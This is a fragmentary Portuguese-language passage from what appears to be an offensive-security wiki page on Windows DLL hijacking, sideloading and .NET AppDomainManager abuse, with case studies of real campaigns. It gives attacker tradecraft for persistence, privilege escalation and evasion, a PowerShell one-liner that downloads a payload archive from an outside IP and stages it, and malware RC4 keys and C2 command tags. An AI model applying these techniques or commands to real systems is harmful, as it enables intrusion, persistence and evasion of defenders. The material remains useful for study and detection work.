...
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto à aplicação copiada, de forma semelhante às técnicas de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

O DLL sideloading clássico não é a única forma de fazer um processo confiável do **.NET Framework** carregar código controlado pelo atacante. Se o executável-alvo for uma aplicação **managed**, o CLR também consulta um arquivo de configuração da aplicação chamado como o executável (por exemplo, `Setup.exe.config`). Esse arquivo pode definir um **AppDomainManager** personalizado. Se a configuração apontar para um assembly controlado pelo atacante colocado ao lado do EXE, o CLR o carregará **antes do caminho normal de execução da aplicação** e o executará dentro do processo confiável.<sup>[[24]](#references)</sup>
...
```
Notas práticas:
- Este é um tradecraft específico do **.NET Framework**. Ele depende da análise da configuração pelo CLR, não da ordem de pesquisa de DLLs do Win32.
...
- O nome do arquivo de configuração precisa corresponder exatamente ao nome do executável (`<binary>.config`) e normalmente fica **ao lado do EXE**.
- Isso é útil com binários **Microsoft/vendor assinados**, porque o EXE confiável permanece intacto enquanto o assembly gerenciado malicioso é executado no processo.
- Se você já tiver um diretório de installer/update gravável, o hijacking de AppDomainManager pode ser usado como **primeiro estágio**, seguido de DLL sideloading clássico ou reflective loading para os estágios posteriores.

### AppDomainManager como downloader + bootstrap de scheduled task

Um padrão prático de intrusão é combinar o EXE gerenciado confiável com um `*.config` malicioso e uma DLL AppDomainManager maliciosa que atua apenas como um **bootstrapper pequeno**:<sup>[[25]](#references)</sup>

1. O usuário inicia um installer ou updater .NET assinado a partir de um local verossímil, como `%USERPROFILE%\Downloads`.
2. A configuração adjacente faz o CLR carregar o assembly do atacante **antes** do início da lógica legítima do app.
3. O manager malicioso executa um **path gate** (por exemplo, continua somente se o host EXE estiver sendo executado a partir de `Downloads` e permite que o segundo estágio seja executado somente a partir de `%LOCALAPPDATA%`).
...
- **Anti-analysis baseada em caminho** simples é comum: mover o trio ZIP/EXE/DLL para Desktop, Temp ou um caminho de sandbox pode interromper intencionalmente a cadeia.
- A DLL AppDomainManager do primeiro estágio pode permanecer pequena e gerar pouco ruído enquanto o implant real é baixado posteriormente.
...
- Essa técnica costuma ser melhor categorizada como **execution/persistence via .NET config abuse** do que como um classic missing-DLL search-order hijacking, embora os operadores frequentemente encadeiem ambas.
...
- Samples que encerram prematuramente, a menos que o caminho do executável corresponda a um diretório esperado no perfil do usuário.

### Hijacking de uma tarefa agendada existente para relançar a cadeia de sideload

Para obter persistence, não procure apenas **creating a new task**. Alguns intrusion sets esperam até que um instalador legítimo crie uma **normal updater task** e então **rewrite the task action**, mantendo familiares para os defenders o nome, o autor e o trigger existentes.
...
3. Substitua apenas a action para que a tarefa inicie seu **trusted host EXE** a partir de um diretório de staging gravável pelo usuário, que então faça sideload ou AppDomain-load do payload real.
4. Registre novamente o mesmo nome de tarefa em vez de criar um novo artefato de persistence óbvio.
```cmd
...
> [!TIP]
> Para uma cadeia passo a passo que combina staging em HTML, configurações AES-CTR e implants .NET sobre DLL sideloading, consulte o workflow abaixo.
...
A forma mais comum de encontrar DLLs ausentes em um sistema é executar o [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **configurando** os **2 filtros a seguir**:

![Técnicas comuns - Encontrando DLLs ausentes: A forma mais comum de encontrar DLLs ausentes em um sistema é executar o procmon do sysinternals, configurando os 2 filtros a seguir](<../../../images/image (961).png>)

![Técnicas comuns - Encontrando DLLs ausentes: A forma mais comum de encontrar DLLs ausentes em um sistema é executar o procmon do sysinternals, configurando os 2 filtros a seguir](<../../../images/image (230).png>)
...
**Aplicações do Windows** procuram DLLs seguindo um conjunto de **caminhos de pesquisa predefinidos**, obedecendo a uma sequência específica. O problema do DLL hijacking ocorre quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, garantindo que seja carregada antes da DLL autêntica. Uma solução para evitar isso é garantir que a aplicação use caminhos absolutos ao referenciar as DLLs necessárias.
...
Existem outras formas de alterar a ordem de pesquisa, mas não vou explicá-las aqui.
...
```
5. Entregue o archive ao inbox/share monitorado; quando a scheduled task relançar o processo, ele carregará a DLL maliciosa e executará seu código com a conta de serviço.
...
Ideia principal
- Construa os parâmetros do processo com RtlCreateProcessParametersEx e forneça um DllPath personalizado que aponte para sua pasta controlada (por exemplo, o diretório onde seu dropper/unpacker está localizado).
- Crie o processo com RtlCreateUserProcess. Quando o binário-alvo resolver uma DLL por nome, o loader consultará o DllPath fornecido durante a resolução, permitindo um sideloading confiável mesmo quando a DLL maliciosa não estiver no mesmo diretório que o EXE-alvo.

Observações/limitações
- Isso afeta o processo filho que está sendo criado; é diferente de SetDllDirectory, que afeta somente o processo atual.
- O alvo deve importar ou executar LoadLibrary para uma DLL por nome (sem caminho absoluto e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
...
- **`<etwEnable enabled="false"/>`** é especialmente interessante porque o **CLR desabilita sua própria visibilidade via ETW** a partir da configuração, em vez de o implant aplicar um patch em `EtwEventWrite` na memória.

Padrão operacional observado em campanhas recentes:
- O estágio 1 grava `setup.exe`, `setup.exe.config` e assemblies locais.
- O estágio 2 os copia para uma pasta **AppData update** plausível, renomeia o host para algo como `update.exe` e o reinicia por meio de uma **scheduled task**.
- O estágio 3 verifica o contexto de execução (por exemplo, o processo pai esperado `svchost.exe` do Task Scheduler) antes de carregar a DLL/export final do RAT.
...
- Scheduled tasks que reiniciam binários de update renomeados a partir de **`%LOCALAPPDATA%`** ou de diretórios específicos de aplicações como `\bin\update\`.
- Cadeias de processos pai/filho nas quais uma scheduled task inicia um host .NET confiável que imediatamente carrega assemblies que não pertencem ao fornecedor a partir de seu próprio diretório.

#### Exceções na ordem de pesquisa de DLLs segundo a documentação do Windows

Algumas exceções à ordem padrão de pesquisa de DLLs são observadas na documentação do Windows:

- Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a pesquisa usual. Em vez disso, ele verifica redirecionamentos e um manifesto antes de usar como padrão a DLL já presente na memória. **Nesse cenário, o sistema não realiza uma pesquisa pela DLL**.
- Quando a DLL é reconhecida como uma **known DLL** para a versão atual do Windows, o sistema utiliza sua versão da known DLL, juntamente com quaisquer DLLs das quais ela dependa, **dispensando o processo de pesquisa**. A chave do registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas known DLLs.
- Caso uma **DLL tenha dependências**, a pesquisa por essas DLLs dependentes é realizada como se elas fossem indicadas apenas por seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada por meio de um caminho completo.

### Escalando privilégios

**Requisitos**:

- Identificar um processo que opere ou vá operar com **privilégios diferentes** (movimento horizontal ou lateral) e que esteja **sem uma DLL**.
- Garantir que exista **acesso de escrita** a qualquer **diretório** no qual a **DLL** será **pesquisada**. Esse local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.

Esses pré-requisitos não são comuns por padrão: executáveis privilegiados normalmente não têm dependências de DLL ausentes, e usuários padrão normalmente não podem gravar em diretórios do caminho de pesquisa do sistema. Ambientes configurados incorretamente ainda podem expor ambas as condições.\
Se os requisitos forem atendidos, verifique o projeto [UACME](https://github.com/hfiref0x/UACME). Embora seu objetivo principal seja o UAC bypass, ele contém PoCs de DLL-hijacking para versões específicas do Windows que frequentemente podem ser adaptados ao diretório gravável encontrado.
...
[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificará se você possui permissões de escrita em alguma pasta dentro do system PATH.\
...
Basicamente, um **Dll proxy** é uma Dll capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** conforme **esperado**, **repassando todas as chamadas para a biblioteca real**.
...
O Windows Narrator.exe ainda procura uma DLL de localização previsível e específica do idioma ao iniciar, que pode ser alvo de hijack para execução arbitrária de código e persistência.<sup>[[7]](#references)</sup>
...
- Você pode clonar uma entrada de registro de uma Accessibility Tool (AT) integrada (por exemplo, CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importá-la e então definir `configuration` com o nome dessa AT. Isso faz proxy de uma execução arbitrária sob o framework de Accessibility.

Notas
- A gravação em `%windir%\System32` e a alteração de valores HKLM exigem direitos de administrador.
- Toda a lógica do payload pode ficar em `DLL_PROCESS_ATTACH`; não são necessários exports.

## Estudo de caso: CVE-2025-1729 - Escalonamento de privilégios usando TPQMAssistant.exe
...
4. Encadeie técnicas padrão de UAC bypass para elevar os privilégios de integridade média para privilégios de SYSTEM.

## Estudo de caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads sob um processo confiável e assinado.<sup>[[10]](#references)</sup>
...
- O dropper grava um EXE legítimo e assinado, além de uma DLL maliciosa, no mesmo diretório (par de exemplo: wsc_proxy.exe assinado pela Avast + wsc.dll controlada pelo atacante).
- Quando o EXE assinado é iniciado, a ordem de pesquisa de DLL do Windows carrega primeiro wsc.dll a partir do diretório de trabalho, executando o código do atacante sob um processo pai assinado (ATT&CK T1574.001).
...
```
Practical sideloading com wsc_proxy.exe
...
```
- Para requisitos de exportação, use um framework de proxy (por exemplo, DLLirant/Spartacus) para gerar uma forwarding DLL que também execute seu payload.

- Esta técnica depende da resolução de nomes de DLL pelo binário host. Se o host usar caminhos absolutos ou flags de carregamento seguro (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack poderá falhar.
...
A Check Point descreveu como o Ink Dragon implanta o ShadowPad usando uma **triad de três arquivos** para se misturar a software legítimo enquanto mantém o payload principal criptografado no disco:<sup>[[12]](#references)</sup>
...
2. **DLL loader maliciosa** – colocada ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL geralmente é um binário MFC ofuscado com o framework ScatterBrain; sua única função é localizar o blob criptografado, descriptografá-lo e fazer o mapeamento refletivo do ShadowPad.
3. **Blob de payload criptografado** – geralmente armazenado como `<name>.tmp` no mesmo diretório. Após mapear em memória o payload descriptografado, o loader exclui o arquivo TMP para destruir evidências forenses.

Notas de tradecraft:

* Renomear o EXE assinado (mantendo o `OriginalFileName` original no cabeçalho PE) permite que ele se passe por um binário do Windows e ainda retenha a assinatura do fornecedor; portanto, replique o hábito do Ink Dragon de soltar binários que parecem `conhost.exe`, mas que na verdade são utilitários da AMD/NVIDIA.
* Como o executável continua confiável, a maioria dos controles de allowlisting só precisa que sua DLL maliciosa esteja ao lado dele. Concentre-se em personalizar a DLL loader; o parent assinado normalmente pode ser executado sem alterações.
...
Os operadores combinam DLL sideloading com LOLBAS para que o único artefato personalizado no disco seja a DLL maliciosa ao lado do EXE confiável:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** O PowerShell oculto inicia `cmd.exe /c`, obtém comandos de um servidor Finger e os encaminha para `cmd`:
...
- **Download/extração integrados:** Baixe um archive com uma extensão benigna, extraia-o e prepare o alvo de sideloading e a DLL em uma pasta `%LocalAppData%` aleatória:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta o progresso e segue redirects; `tar -xf` usa o tar integrado ao Windows.

- **Execução via WMI/CIM:** Inicie o EXE via WMI para que a telemetria mostre um processo criado pelo CIM enquanto ele carrega a DLL colocada ao lado:
...
Uma intrusão recente do Lotus Blossom abusou de uma cadeia de atualização confiável para entregar um dropper empacotado com NSIS que preparava um DLL sideload e payloads totalmente in-memory.<sup>[[13]](#references)</sup>
...
- O EXE host importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` carrega o blob via mmap; `LogWrite` o descriptografa com um stream baseado em LCG personalizado (constantes **0x19660D** / **0x3C6EF35F**, com o material da chave derivado de um hash anterior), sobrescreve o buffer com shellcode em plaintext, libera os temporários e salta para ele.
- Para evitar uma IAT, o loader resolve APIs fazendo hash dos nomes de export usando a base FNV-1a 0x811C9DC5 + o prime 0x100019, aplicando depois um avalanche no estilo Murmur (**0x85EBCA6B**) e comparando com hashes de destino com salt.
...
- Reconstrói as strings de nomes de DLL em runtime por meio de transformações de bit-rotate/XOR por caractere e, em seguida, carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
...
- A configuração reside no arquivo `BluetoothService` solto no **offset 0x30808** (tamanho **0x980**) e é descriptografada com RC4 usando a chave `qwhvb^435h&*7`, revelando a URL do C2 e o User-Agent.
- Os beacons criam um perfil de host delimitado por pontos, acrescentam a tag `4Q` e então criptografam com RC4 usando a chave `vAuig34%^325hGV` antes de `HttpSendRequestA` via HTTPS. As respostas são descriptografadas com RC4 e distribuídas por um tag switch (`4T` shell, `4V` execução de processo, `4W/4X` gravação de arquivo, `4Y` leitura/exfil, `4\\` desinstalação, `4` enumeração de drives/arquivos + casos de transferência em chunks).
- O modo de execução é controlado por argumentos CLI: sem argumentos = instala persistence (service/Run key) apontando para `-i`; `-i` inicia novamente a si próprio com `-k`; `-k` ignora a instalação e executa o payload.
...
```
- Este estágio de compilação e execução baseado em TCC importou `Wininet.dll` em runtime e obteve um shellcode de segundo estágio a partir de uma URL codificada diretamente, fornecendo um loader flexível que se disfarça como uma execução do compilador.

## Sideloading de DLL em host assinado com proxying de exports + estacionamento da thread do host
...
- A DLL maliciosa faz **proxy de todos os exports esperados** de volta para a DLL de sistema real (por exemplo, `%SystemRoot%\\System32\\version.dll`), para que a resolução de imports continue funcionando e o processo do host permaneça operacional.
...
- Uma nova thread executa o trabalho malicioso real: descriptografar o nome ou caminho da DLL de próximo estágio (RC4/XOR são comuns) e depois iniciá-la com `LoadLibrary`.

Por que isso importa
- O proxying normal de DLL preserva a compatibilidade da API, mas não garante que o host permanecerá ativo por tempo suficiente para os estágios posteriores.
- Manter a thread principal em `Sleep(INFINITE)` é uma maneira simples de manter o processo assinado residente enquanto o loader executa a descriptografia, o staging ou o bootstrap de rede em uma worker thread.
- A hunting focada apenas em um `DllMain` suspeito pode não identificar esse padrão se o comportamento interessante ocorrer depois que o entry point do host for modificado e uma thread secundária for iniciada.

Workflow mínimo
1. Copie o EXE do host assinado e determine de qual DLL ele resolve a partir do diretório local.
2. Compile uma proxy DLL exportando as mesmas funções e encaminhando-as para a DLL legítima.
3. Em `DllMain(DLL_PROCESS_ATTACH)`, crie uma worker thread.
4. A partir dessa thread, modifique o entry point do host ou a rotina de início da thread principal para que ela entre em loop em `Sleep`.
5. Descriptografe o nome/configuração da DLL de próximo estágio e chame `LoadLibrary` ou faça o manual-map do payload.
